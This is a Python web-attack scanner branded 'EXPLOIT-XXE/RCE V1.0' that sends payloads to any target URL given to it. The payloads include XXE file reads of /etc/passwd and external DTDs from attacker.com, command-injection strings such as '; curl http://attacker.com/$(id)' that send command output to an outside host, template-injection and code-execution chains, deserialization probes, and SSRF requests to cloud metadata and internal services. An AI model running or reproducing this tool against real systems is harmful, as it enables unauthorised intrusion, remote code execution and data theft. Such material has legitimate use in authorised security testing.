#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import xml.etree.ElementTree as ET
import json
import re
import sys
import time
import base64
import urllib.parse
from threading import Thread
from queue import Queue

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class AdvancedExploitScanner:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })

        self.vulnerabilities = []
        self.techniques = {
            'xxe': [],
            'rce': [],
            'ssti': [],
            'deserialization': [],
            'ssrf': []
        }

        self.banner()

    def banner(self):
        print(f"""{Colors.BOLD}{Colors.CYAN}
╔══════════════════════════════════════════════╗
║             EXPLOIT-XXE/RCE V1.0             ║
║t.me/Red_Rooted_ghost :github.com/Dark-ghost-x║
╚══════════════════════════════════════════════╝
{Colors.RESET}
{Colors.YELLOW}Target: {self.target}
Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
{Colors.RESET}""")

    def scan_all(self):
        print(f"\n{Colors.BOLD}{Colors.GREEN}[+] Starting Scan...{Colors.RESET}")


        print(f"\n{Colors.BOLD}{Colors.MAGENTA}[1] XML External Entity (XXE) Tests{Colors.RESET}")
        self.test_xxe()


        print(f"\n{Colors.BOLD}{Colors.MAGENTA}[2] Remote Code Execution (RCE) Tests{Colors.RESET}")
        self.test_rce()


        print(f"\n{Colors.BOLD}{Colors.MAGENTA}[3] SSTI Tests{Colors.RESET}")
        self.test_ssti()


        print(f"\n{Colors.BOLD}{Colors.MAGENTA}[4] Deserialization Tests{Colors.RESET}")
        self.test_deserialization()


        print(f"\n{Colors.BOLD}{Colors.MAGENTA}[5] SSRF Tests{Colors.RESET}")
        self.test_ssrf()


        print(f"\n{Colors.BOLD}{Colors.MAGENTA}[6] Information Gathering{Colors.RESET}")
        self.info_gathering()

        self.generate_report()

    def test_xxe(self):
        """تست XXE با پیلودهای مختلف"""
        print(f"{Colors.WHITE}[*] Testing for XXE vulnerabilities...{Colors.RESET}")


        xxe_payloads = [

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "XXE_SUCCESS">]><root>&test;</root>',


            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',


            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;]>',


            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',


            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',


            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>'
        ]


        endpoints = [
            self.target,
            f"{self.target}/api",
            f"{self.target}/xml",
            f"{self.target}/soap",
            f"{self.target}/rest",
            f"{self.target}/upload"
        ]

        headers_list = [
            {'Content-Type': 'application/xml'},
            {'Content-Type': 'text/xml'},
            {'Content-Type': 'application/soap+xml'}
        ]

        for endpoint in endpoints:
            for headers in headers_list:
                for i, payload in enumerate(xxe_payloads):
                    try:
                        print(f"{Colors.CYAN}  Testing: {endpoint} [Payload {i+1}]{Colors.RESET}")

                        if 'soap' in endpoint:

                            soap_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
{payload}
</soap:Body>
</soap:Envelope>"""
                            resp = self.session.post(endpoint, data=soap_payload, headers=headers, timeout=5)
                        else:

                            resp = self.session.post(endpoint, data=payload, headers=headers, timeout=5)


                        indicators = [
                            'root:x:', 'daemon:x:', 'bin:x:',
                            '[boot loader]', '[fonts]',
                            'XXE_SUCCESS',
                            'PD9waHA',
                            'system', 'eval', 'exec'
                        ]

                        for indicator in indicators:
                            if indicator in resp.text:
                                self.vulnerabilities.append({
                                    'type': 'XXE',
                                    'endpoint': endpoint,
                                    'payload': payload[:100] + '...' if len(payload) > 100 else payload,
                                    'indicator': indicator,
                                    'severity': 'CRITICAL'
                                })
                                print(f"{Colors.RED}  [+] XXE Vulnerability Found! {indicator}{Colors.RESET}")
                                break

                    except Exception as e:
                        continue

    def test_rce(self):
        """تست RCE با تکنیک‌های مختلف"""
        print(f"{Colors.WHITE}[*] Testing for RCE vulnerabilities...{Colors.RESET}")


        cmd_payloads = [

            '; id',
            '| id',
            '`id`',
            '$(id)',
            '|| id',
            '&& id',


            '<?php system("id"); ?>',
            '<?php echo shell_exec("id"); ?>',
            '${@system("id")}',


            '__import__("os").system("id")',
            'eval("__import__(\'os\').system(\'id\')")',


            'Runtime.getRuntime().exec("id")',


            'require("child_process").exec("id")',


            '& whoami',
            '| whoami',


            'sleep 5',
            'ping -c 5 127.0.0.1',


            '; curl http://attacker.com/$(id)',
            '; wget http://attacker.com/`whoami`'
        ]


        test_params = {
            'cmd': cmd_payloads,
            'command': cmd_payloads,
            'exec': cmd_payloads,
            'system': cmd_payloads,
            'shell': cmd_payloads,
            'input': cmd_payloads,
            'code': cmd_payloads,
            'eval': cmd_payloads,
            'query': cmd_payloads
        }


        parsed = urllib.parse.urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)


        test_urls = []


        if query:
            for param in query.keys():
                test_urls.append(f"{base_url}{path}?{param}=TEST")
        else:

            for param in ['cmd', 'command', 'exec', 'system']:
                test_urls.append(f"{base_url}{path}?{param}=TEST")


        common_endpoints = [
            '/exec', '/cmd', '/system', '/shell',
            '/api/exec', '/api/cmd', '/admin/exec',
            '/cgi-bin/test.cgi', '/cgi-bin/status'
        ]

        for endpoint in common_endpoints:
            test_urls.append(f"{base_url}{endpoint}")

        for url in test_urls:
            for payload in cmd_payloads[:10]:
                try:

                    test_url = url.replace('TEST', urllib.parse.quote(payload))
                    start_time = time.time()
                    resp = self.session.get(test_url, timeout=10)
                    elapsed = time.time() - start_time


                    rce_indicators = [
                        'uid=', 'gid=', 'groups=',
                        'Administrator', 'admin',
                        'Microsoft Windows',
                        'total', 'used', 'free',
                        'Volume in drive',
                        'Directory of'
                    ]


                    if 'sleep' in payload or 'ping' in payload:
                        if elapsed > 4:
                            self.vulnerabilities.append({
                                'type': 'Blind RCE',
                                'endpoint': url,
                                'payload': payload,
                                'technique': 'Time-based',
                                'response_time': elapsed,
                                'severity': 'CRITICAL'
                            })
                            print(f"{Colors.RED}  [+] Blind RCE Found! (Time: {elapsed:.2f}s){Colors.RESET}")

                    for indicator in rce_indicators:
                        if indicator in resp.text:
                            self.vulnerabilities.append({
                                'type': 'RCE',
                                'endpoint': url,
                                'payload': payload,
                                'indicator': indicator,
                                'severity': 'CRITICAL'
                            })
                            print(f"{Colors.RED}  [+] RCE Found! {indicator}{Colors.RESET}")
                            break


                    if '=' in url:
                        param = url.split('=')[0].split('?')[-1]
                        data = {param: payload}
                        resp_post = self.session.post(base_url + path, data=data, timeout=5)

                        for indicator in rce_indicators:
                            if indicator in resp_post.text:
                                self.vulnerabilities.append({
                                    'type': 'RCE (POST)',
                                    'endpoint': base_url + path,
                                    'parameter': param,
                                    'payload': payload,
                                    'indicator': indicator,
                                    'severity': 'CRITICAL'
                                })
                                print(f"{Colors.RED}  [+] RCE via POST Found! {indicator}{Colors.RESET}")
                                break

                except Exception as e:
                    continue

    def test_ssti(self):
        """تست Server-Side Template Injection"""
        print(f"{Colors.WHITE}[*] Testing for SSTI vulnerabilities...{Colors.RESET}")

        ssti_payloads = {
            'jinja2': [
                '{{7*7}}',
                '{{config}}',
                '{{self}}',
                '{{"".__class__.__mro__[1].__subclasses__()}}',
                '{{cycler.__init__.__globals__.os.popen("id").read()}}'
            ],
            'twig': [
                '{{7*7}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}',
                '{{_self.env.getFilter("id")}}'
            ],
            'freemarker': [
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                '${7*7}'
            ],
            'velocity': [
                '#set($x=7*7)${x}',
                '#set($str=$class.inspect("java.lang.String").type)'
            ],
            'ruby': [
                '<%= 7*7 %>',
                '<%= system("id") %>'
            ]
        }


        test_params = ['name', 'template', 'view', 'page', 'file', 'template_name']

        for param in test_params:
            for engine, payloads in ssti_payloads.items():
                for payload in payloads[:3]:
                    try:
                        test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                        resp = self.session.get(test_url, timeout=5)


                        if '49' in resp.text and '7*7' in payload:
                            self.vulnerabilities.append({
                                'type': 'SSTI',
                                'engine': engine,
                                'parameter': param,
                                'payload': payload,
                                'indicator': '7*7=49 detected',
                                'severity': 'HIGH'
                            })
                            print(f"{Colors.YELLOW}  [+] SSTI Found! ({engine}){Colors.RESET}")


                        data = {param: payload}
                        resp_post = self.session.post(self.target, data=data, timeout=5)

                        if '49' in resp_post.text and '7*7' in payload:
                            self.vulnerabilities.append({
                                'type': 'SSTI (POST)',
                                'engine': engine,
                                'parameter': param,
                                'payload': payload,
                                'indicator': '7*7=49 detected',
                                'severity': 'HIGH'
                            })
                            print(f"{Colors.YELLOW}  [+] SSTI via POST Found! ({engine}){Colors.RESET}")

                    except:
                        continue

    def test_deserialization(self):
        """تست آسیب‌پذیری‌های Deserialization"""
        print(f"{Colors.WHITE}[*] Testing for Deserialization vulnerabilities...{Colors.RESET}")


        java_payloads = [

            'rO0ABX',
            'aced0005',


            'java.lang.Runtime',
            'org.apache.commons.collections',
            'com.sun.org.apache.xalan.internal'
        ]


        php_payloads = [
            'O:8:"stdClass":0:{}',
            'a:1:{s:4:"test";s:4:"test";}',
            's:10:"__PHP_Incomplete_Class_Name";'
        ]


        python_payloads = [
            'ccopy_reg\n_reconstructor',
            '(dp0\nV__reduce__\np1',
            'c__builtin__\neval'
        ]


        test_params = ['data', 'input', 'object', 'serialized', 'session', 'state']

        for param in test_params:

            for payload in java_payloads:
                try:

                    b64_payload = base64.b64encode(payload.encode()).decode()
                    test_url = f"{self.target}?{param}={b64_payload}"
                    resp = self.session.get(test_url, timeout=5)


                    if 'java.' in resp.text or 'Serialization' in resp.text or 'readObject' in resp.text:
                        self.vulnerabilities.append({
                            'type': 'Java Deserialization',
                            'parameter': param,
                            'payload': payload,
                            'severity': 'CRITICAL'
                        })
                        print(f"{Colors.RED}  [+] Java Deserialization Found!{Colors.RESET}")

                except:
                    continue


            for payload in php_payloads:
                try:

                    encoded = urllib.parse.quote(payload)
                    test_url = f"{self.target}?{param}={encoded}"
                    resp = self.session.get(test_url, timeout=5)

                    if '__PHP_Incomplete_Class' in resp.text or 'unserialize()' in resp.text:
                        self.vulnerabilities.append({
                            'type': 'PHP Deserialization',
                            'parameter': param,
                            'payload': payload,
                            'severity': 'HIGH'
                        })
                        print(f"{Colors.YELLOW}  [+] PHP Deserialization Found!{Colors.RESET}")

                except:
                    continue

    def test_ssrf(self):
        """تست Server-Side Request Forgery"""
        print(f"{Colors.WHITE}[*] Testing for SSRF vulnerabilities...{Colors.RESET}")


        ssrf_test_urls = [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:22',
            'http://localhost:6379',
            'http://localhost:9200',
            'http://localhost:27017',
            'file:///etc/passwd',
            'gopher://localhost:80/_GET%20/',
            'dict://localhost:6379/info'
        ]


        ssrf_params = ['url', 'link', 'src', 'file', 'path', 'image', 'load', 'request']

        for param in ssrf_params:
            for test_url in ssrf_test_urls[:3]:
                try:
                    encoded_url = urllib.parse.quote(test_url)
                    target = f"{self.target}?{param}={encoded_url}"

                    start_time = time.time()
                    resp = self.session.get(target, timeout=10)
                    elapsed = time.time() - start_time


                    ssrf_indicators = [
                        'ami-id', 'instance-id',
                        'root:x:',
                        'SSH-2.0',
                        'REDIS',
                        'product" : "Elasticsearch',
                        'MongoDB',
                    ]

                    for indicator in ssrf_indicators:
                        if indicator in resp.text:
                            self.vulnerabilities.append({
                                'type': 'SSRF',
                                'parameter': param,
                                'test_url': test_url,
                                'indicator': indicator,
                                'severity': 'HIGH'
                            })
                            print(f"{Colors.YELLOW}  [+] SSRF Found! ({indicator}){Colors.RESET}")
                            break


                    data = {param: test_url}
                    resp_post = self.session.post(self.target, data=data, timeout=10)

                    for indicator in ssrf_indicators:
                        if indicator in resp_post.text:
                            self.vulnerabilities.append({
                                'type': 'SSRF (POST)',
                                'parameter': param,
                                'test_url': test_url,
                                'indicator': indicator,
                                'severity': 'HIGH'
                            })
                            print(f"{Colors.YELLOW}  [+] SSRF via POST Found! ({indicator}){Colors.RESET}")
                            break

                except Exception as e:
                    continue

    def info_gathering(self):
        """جمع‌آوری اطلاعات عمومی"""
        print(f"{Colors.WHITE}[*] Gathering server information...{Colors.RESET}")

        try:
            resp = self.session.get(self.target, timeout=5)


            headers = resp.headers


            info = {
                'Server': headers.get('Server', 'Not Found'),
                'X-Powered-By': headers.get('X-Powered-By', 'Not Found'),
                'Content-Type': headers.get('Content-Type', 'Not Found'),
                'Status': resp.status_code
            }


            tech_detected = []

            if 'PHP' in info['X-Powered-By'] or '.php' in resp.text:
                tech_detected.append('PHP')
            if 'ASP.NET' in info['X-Powered-By'] or 'ASP.NET' in info['Server']:
                tech_detected.append('ASP.NET')
            if 'Node.js' in info['Server'] or 'Express' in info['X-Powered-By']:
                tech_detected.append('Node.js')
            if 'Python' in info['Server'] or 'Django' in info['X-Powered-By']:
                tech_detected.append('Python')
            if 'Java' in info['Server'] or 'JSP' in resp.text:
                tech_detected.append('Java')
            if 'WordPress' in resp.text or 'wp-content' in resp.text:
                tech_detected.append('WordPress')

            print(f"{Colors.CYAN}  [+] Server: {info['Server']}{Colors.RESET}")
            print(f"{Colors.CYAN}  [+] Technologies: {', '.join(tech_detected) if tech_detected else 'Unknown'}{Colors.RESET}")
            print(f"{Colors.CYAN}  [+] Status: {info['Status']}{Colors.RESET}")


            self.techniques['info'] = {
                'headers': dict(headers),
                'technologies': tech_detected,
                'status': info['Status']
            }

        except Exception as e:
            print(f"{Colors.RED}  [-] Info gathering failed: {e}{Colors.RESET}")

    def generate_report(self):
        """تولید گزارش"""
        print(f"\n{Colors.BOLD}{Colors.GREEN}[+] Generating Final Report...{Colors.RESET}")
        print(f"{Colors.WHITE}{'='*80}{Colors.RESET}")

        if not self.vulnerabilities:
            print(f"{Colors.YELLOW}[!] No critical vulnerabilities found.{Colors.RESET}")
            print(f"{Colors.CYAN}[*] Target appears to be secure against tested attacks.{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Found {len(self.vulnerabilities)} potential vulnerabilities:{Colors.RESET}\n")


            by_type = {}
            for vuln in self.vulnerabilities:
                vuln_type = vuln['type']
                if vuln_type not in by_type:
                    by_type[vuln_type] = []
                by_type[vuln_type].append(vuln)


            for vuln_type, vulns in by_type.items():
                print(f"{Colors.BOLD}{Colors.MAGENTA}▶ {vuln_type} ({len(vulns)}){Colors.RESET}")
                for i, vuln in enumerate(vulns[:3], 1):
                    print(f"  {Colors.YELLOW}{i}.{Colors.RESET} {vuln.get('endpoint', vuln.get('parameter', 'N/A'))}")
                    print(f"     Payload: {vuln.get('payload', 'N/A')[:50]}...")
                    print(f"     Severity: {Colors.RED if vuln['severity'] == 'CRITICAL' else Colors.YELLOW}{vuln['severity']}{Colors.RESET}")
                    if 'indicator' in vuln:
                        print(f"     Indicator: {vuln['indicator']}")
                    print()

        print(f"{Colors.WHITE}{'='*80}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}[*] Scan completed at {time.strftime('%H:%M:%S')}{Colors.RESET}")


        try:
            with open('scan_results.txt', 'w') as f:
                f.write(f"Scan Report for {self.target}\n")
                f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Vulnerabilities Found: {len(self.vulnerabilities)}\n\n")

                for vuln in self.vulnerabilities:
                    f.write(f"Type: {vuln['type']}\n")
                    f.write(f"Endpoint: {vuln.get('endpoint', vuln.get('parameter', 'N/A'))}\n")
                    f.write(f"Payload: {vuln.get('payload', 'N/A')}\n")
                    f.write(f"Severity: {vuln['severity']}\n")
                    f.write("-" * 40 + "\n")

            print(f"{Colors.GREEN}[+] Report saved to 'scan_results.txt'{Colors.RESET}")
        except:
            print(f"{Colors.RED}[-] Failed to save report{Colors.RESET}")

def main():
    if len(sys.argv) != 2:
        print(f"{Colors.RED}Usage: python {sys.argv[0]} <target_url>{Colors.RESET}")
        print(f"{Colors.YELLOW}Example: python {sys.argv[0]} http://target.com/test.php{Colors.RESET}")
        sys.exit(1)

    target = sys.argv[1]


    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    scanner = AdvancedExploitScanner(target)
    scanner.scan_all()

if __name__ == "__main__":
    main()
